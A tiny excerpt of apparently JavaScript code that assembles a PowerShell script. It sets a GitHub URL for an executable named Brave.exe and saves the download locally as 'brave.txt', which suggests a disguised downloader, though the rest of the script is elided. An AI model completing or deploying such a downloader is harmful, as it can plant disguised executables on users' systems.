...
let script = [
    ...
    "$exeUrl = 'https://github.com/luciferseamus/Browser_exe/raw/main/Brave/Brave.exe';", // URL of the executable
    ...
    "$fileName = '.\\brave.txt';", //Output filename
